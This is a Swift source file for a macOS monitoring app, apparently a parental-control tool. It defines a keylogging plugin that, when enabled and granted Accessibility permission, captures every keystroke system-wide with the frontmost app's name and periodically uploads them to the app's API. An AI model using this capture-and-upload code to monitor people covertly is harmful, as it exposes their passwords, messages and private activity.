import Cocoa
import Foundation
import SharedCore

class KeyloggingPlugin: Plugin {
  private var store: AppStore
  private var timer: Timer?
  private var eventMonitor: Any?

  init(store: AppStore) {
    self.store = store
    configure()
  }

  func configure() {
    cleanup()
    guard store.state.monitoring.keyloggingEnabled, Self.permissionGranted else {
      return
    }

    eventMonitor = NSEvent.addGlobalMonitorForEvents(matching: [.keyDown]) { event in
      guard let keystroke = Keystroke(from: event), let appName = self.frontmostApp else {
        debug(.unusableKeystroke(event, self.frontmostApp))
        return
      }
      GlobalKeystrokes.shared.receive(keystroke: keystroke, from: appName)
    }

    timer = Timer.repeating(every: .minutes(5)) { _ in uploadAllKeystrokes() }
    log(.plugin("Keylogging", .info("started keylogging")))
  }

  func cleanup() {
    if let eventMonitor = eventMonitor {
      NSEvent.removeMonitor(eventMonitor)
      log(.plugin("Keylogging", .info("stopped keylogging")))
    }
    eventMonitor = nil
    timer?.invalidate()
  }

  func respond(to event: AppEvent) {
    switch event {
    case .keyloggingStateChanged:
      configure()
    case .appWillSleep:
      uploadAllKeystrokes(qos: .userInitiated)
    default:
      break
    }
  }

  func onTerminate() {
    uploadAllKeystrokes(qos: .userInitiated)
    cleanup()
  }

  private var frontmostApp: String? {
    NSWorkspace.shared.frontmostApplication?.localizedName
  }

  static var permissionGranted: Bool {
    let options: NSDictionary = [kAXTrustedCheckOptionPrompt.takeUnretainedValue() as String: true]
    return AXIsProcessTrustedWithOptions(options)
  }
}

private func uploadAllKeystrokes(qos: DispatchQoS.QoSClass = .background) {
  guard !GlobalKeystrokes.shared.appKeystrokes.isEmpty else { return }

  DispatchQueue.global(qos: qos).async {
    Current.api.uploadKeystrokes()
  }
}
